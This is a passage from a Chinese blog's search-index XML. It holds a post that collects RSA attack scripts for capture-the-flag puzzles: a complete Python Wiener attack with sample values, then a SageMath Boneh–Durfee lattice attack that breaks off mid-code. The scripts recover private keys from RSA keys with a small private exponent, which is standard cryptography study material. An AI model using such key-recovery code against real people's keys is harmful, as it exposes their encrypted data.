<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RSA脚本收集(不懂原理的那种)</title>
      <link href="/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/"/>
      <url>/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><p>一般给出n、e、c<br>e指数很大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">continuedFra</span>(<span class="hljs-params">x, y</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算连分数</span><br><span class="hljs-string">    :param x: 分子</span><br><span class="hljs-string">    :param y: 分母</span><br><span class="hljs-string">    :return: 连分数列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gradualFra</span>(<span class="hljs-params">cf</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span><br><span class="hljs-string">    :param cf: 连分数列表</span><br><span class="hljs-string">    :return: 该列表最后的渐近分数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># 这里的渐进分数分子分母要分开</span><br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_pq</span>(<span class="hljs-params">a, b, c</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span><br><span class="hljs-string">    :param a:x^2的系数</span><br><span class="hljs-string">    :param b:x的系数</span><br><span class="hljs-string">    :param c:pq</span><br><span class="hljs-string">    :return:p，q</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getGradualFra</span>(<span class="hljs-params">cf</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算列表所有的渐近分数</span><br><span class="hljs-string">    :param cf: 连分数列表</span><br><span class="hljs-string">    :return: 该列表所有的渐近分数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wienerAttack</span>(<span class="hljs-params">e, n</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    :param e:</span><br><span class="hljs-string">    :param n:</span><br><span class="hljs-string">    :return: 私钥d</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br><br>n= <span class="hljs-number">68781015120012754009149819243839432182753699533745468739333557116438115901358573880902197723852823949505376140916570536753019491036629572363854637530919546688901226752085109196549145599781909847664046508960094447692268230516763088293911965638780888720788954194778424857089535187609738198309161969913567107861</span><br>e= <span class="hljs-number">54093680529782962282616750547542407544796590039913570980901028264103594185617926725669901283009540557359666956131385125727959502505561517117179644650419753631214251337533961664493198676862110639584202010794500844074619335752668896589407110076134931918634061631574656816488381501901503924226166074238518619869</span><br>c= <span class="hljs-number">30443384983816710270001651296607959522389400057103143909277631290995899073895621701281106228069835965181342091582584186637031613250922961166298411359757600825556083868477673357860585539016515776933117915504873987178857740106223631465737111746470236003857656528610755145017342412306680097140732745012583119076</span><br><br>d=wienerAttack(e, n)<br>m=<span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m).decode()) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13393985">搬运来源</a></p><hr><h2 id="sage脚本-Boneh-Durfee-攻击"><a href="#sage脚本-Boneh-Durfee-攻击" class="headerlink" title="sage脚本_Boneh Durfee 攻击"></a>sage脚本_Boneh Durfee 攻击</h2><p>当用维纳攻击解不出来，可以用这个试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting debug to true will display more informations</span><br><span class="hljs-string">about the lattice, the bounds, the vectors...</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>debug = <span class="hljs-literal">True</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting strict to true will stop the algorithm (and</span><br><span class="hljs-string">return (-1, -1)) if we don&#x27;t have a correct</span><br><span class="hljs-string">upperbound on the determinant. Note that this</span><br><span class="hljs-string">doesn&#x27;t necesseraly mean that no solutions</span><br><span class="hljs-string">will be found since the theoretical upperbound is</span><br><span class="hljs-string">usualy far away from actual results. That is why</span><br><span class="hljs-string">you should probably use `strict = False`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>strict = <span class="hljs-literal">False</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">This is experimental, but has provided remarkable results</span><br><span class="hljs-string">so far. It tries to reduce the lattice as much as it can</span><br><span class="hljs-string">while keeping its efficiency. I see no reason not to use</span><br><span class="hljs-string">this option, but if things don&#x27;t work, you should try</span><br><span class="hljs-string">disabling it</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <span class="hljs-comment"># stop removing if lattice reaches that dimension</span><br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Functions</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-comment"># display stats on helpful vectors</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):</span><br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii,ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span> (nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><span class="hljs-comment"># display matrix picture with 0 and X</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii,jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-built_in">print</span> (a)<br><br><span class="hljs-comment"># tries to remove unhelpful vectors</span><br><span class="hljs-comment"># we start at current = n-1 (last vector)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):</span><br>    <span class="hljs-comment"># end of our recursive function</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># we start by checking from the end</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># if it is unhelpful:</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># let&#x27;s check if it affects other vectors</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># if another vector is affected:</span><br>                <span class="hljs-comment"># we increase the count</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># level:0</span><br>            <span class="hljs-comment"># if no other vectors end up affected</span><br>            <span class="hljs-comment"># we remove it</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* removing unhelpful vector&quot;</span>, ii)<br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># level:1</span><br>            <span class="hljs-comment"># if just one was affected we check</span><br>            <span class="hljs-comment"># if it is affecting someone else</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># if it is affecting even one vector</span><br>                    <span class="hljs-comment"># we give up on this one</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># remove both it if no other vector was affected and</span><br>                <span class="hljs-comment"># this helpful vector is not helpful enough</span><br>                <span class="hljs-comment"># compared to our unhelpful one</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(bound - BB[ii, ii]):<br>                    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="hljs-string">&quot;and&quot;</span>, affected_vector_index)<br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string"></span><br><span class="hljs-string">    finds a solution if:</span><br><span class="hljs-string">    * d &lt; N^delta</span><br><span class="hljs-string">    * |x| &lt; e^delta</span><br><span class="hljs-string">    * |y| &lt; e^0.5</span><br><span class="hljs-string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)<br>    Q = PR.quotient(x*y + <span class="hljs-number">1</span> - u) <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX*YY + <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-shifts</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># x-shifts list of monomials</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():<br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:<br>                monomials.append(monomial)<br>    monomials.sort()<br><br>    <span class="hljs-comment"># y-shifts (selected by Herrman and May)</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift) <span class="hljs-comment"># substitution</span><br><br>    <span class="hljs-comment"># y-shifts list of monomials</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u^kk * y^jj)<br><br>    <span class="hljs-comment"># construct lattice B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)<br><br>    <span class="hljs-comment"># Prototype to reduce the lattice</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment"># automatically remove</span><br>        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># reset dimension</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># check if vectors are helpful</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus^mm)<br><br>    <span class="hljs-comment"># check if determinant is correctly bounded</span><br>    det = BB.det()<br>    bound = modulus^(mm*nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus^mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;looking for independent vectors in the lattice&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br>            <span class="hljs-comment"># for i and j, create the two polynomials</span><br>            PR.&lt;w,z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)<br>                pol2 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)<br><br>            <span class="hljs-comment"># resultant</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr 